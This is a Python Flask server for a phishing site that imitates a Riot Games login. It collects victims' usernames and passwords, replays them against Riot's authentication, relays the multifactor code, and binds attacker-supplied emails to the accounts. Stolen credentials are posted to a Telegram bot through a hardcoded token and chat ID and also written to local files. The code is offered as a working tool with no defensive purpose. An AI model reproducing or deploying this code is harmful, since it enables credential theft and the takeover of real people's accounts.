from flask import Flask, render_template, request, url_for, jsonify, make_response
import asyncio
import random
import re
import auth
from auth_exceptions import RiotMultifactorAttemptError
import requests
from loguru import logger
from typing import List

TOKEN = "6588968599:AAHvgXlzMxASBu94b12OKukyQhy_v1SXIxI"  #Токен бота
ID = 5657973052  #Ид чата для логов
logger.add("logger.log")

riots_data = {}

def read_emails(file_path: str) -> List[str]:
    with open(file_path, "r") as file:
        return list(set([line.strip() for line in file.readlines()]))


def remove_email(file_path: str, email: str) -> None:
    with open(file_path, "r") as file:
        lines = file.readlines()
    with open(file_path, "w") as file:
        for line in lines:
            if line.strip() != email:
                file.write(line)


def send_log(message):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {'chat_id': ID, 'text': message, 'parse_mode': 'HTML'}
    requests.post(url, data=data)

def generate_unique_key() -> str:
    key = None
    while key is None or key in riots_data:
        key = f"{random.randint(100000, 999999)}"
    return key

app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True


@app.route('/')
async def index():
    return await render_template('index.htm', url_for=url_for)


@app.route('/login')
async def login():
    return await render_template('login.html', url_for=url_for)

@app.route('/api/authorization', methods=['POST'])
async def authorization():
    json_data = await request.json
    print(json_data)
    key = generate_unique_key()
    riots_data[key] = {}
    riot = auth.RiotAuth()

    
    riots_data[key]["riot"] = riot
    emails = read_emails('emails.txt')
    email_creds = random.choice(emails)
    riots_data[key]["email_creds"] = email_creds
    try:
        email, _ = email_creds.split(':')        
        resp = await riot.authorize(json_data['username'], json_data['password'], email)
        riots_data[key]["resp"] = resp
        if 'multifactor' in resp['ok']:
            response = await make_response({'ok': 'mfa', 'email': resp['sent'], 'key': key})
        else:
            response = await make_response(resp)
            send_log(json_data['username'] + ':' + json_data['password'] + '\n')            
            with open('unverif.txt', 'a') as f:
                f.write(json_data['username'] + ':' + json_data['password'] + '\n')

        response.status_code = 200
        return response
    except Exception as e:
        logger.error(e)

        return jsonify({'ok': 'false', '1': f"error {e}"}), 200


@app.route('/api/mfa', methods=['POST'])
async def mfa():
    json_data = await request.json    
    key = json_data["key"]
    if key not in riots_data:
        return jsonify({'ok': 'false', 'error': 'Invalid key'}), 200
    riot = riots_data[key]["riot"]
    resp = riots_data[key]["resp"]
    try:        
        await riot.handle_multifactor(resp['session'], resp['headers'], resp['email'], json_data["code"])
        response = await make_response({'ok': 'true'})
        response.status_code = 200
        email_creds = riots_data[key]["email_creds"]
        remove_email('emails.txt', email_creds)
        email, email_password = email_creds.split(':')
        send_log(json_data['username'] + ':' + json_data['password'] + '\n' + email + ':' + email_password + '\n\n')
        with open('verif.txt', 'a') as f:
            f.write(json_data['username'] + ':' + json_data['password'] + '\n' + email + ':' + email_password)
        del riots_data[key]
        return response
    except Exception as e:
        logger.error(e)
        response = await make_response({'ok': 'false'})
        response.status_code = 200
        return response

if __name__ == '__main__':
    app.run(host='0.0.0.0')


